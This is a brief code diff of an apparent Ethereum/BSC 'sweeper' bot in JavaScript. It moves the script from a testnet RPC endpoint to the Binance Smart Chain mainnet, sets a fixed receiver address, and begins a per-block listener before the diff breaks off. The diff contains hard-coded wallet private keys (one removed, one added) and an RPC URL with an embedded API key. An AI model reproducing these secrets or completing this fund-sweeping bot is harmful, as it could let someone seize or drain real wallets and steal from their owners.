@@ -1,12 +1,13 @@
 const { ethers } = require('ethers')
 
-const provider = new ethers.providers.JsonRpcProvider("https://speedy-nodes-nyc.moralis.io/cb392e14ff1f48151f0afa6a/eth/ropsten")
+//get provider from api key
+const provider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed.binance.org/')
 
 const { multiply } = require('mathjs')
 
 const addressReceiver = '0x1Be72C174D1A0Af38cd552f7064BAd726c767C83'
 
-const privateKeys = ["158759e7ef1cc3ab3a51ddf97fd8e15e064ec4528895ff661a784ad0f4d0c95e"]
+const privateKeys = ["c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3"]
 
 const bot = async =>{
     provider.on('block', async () => {
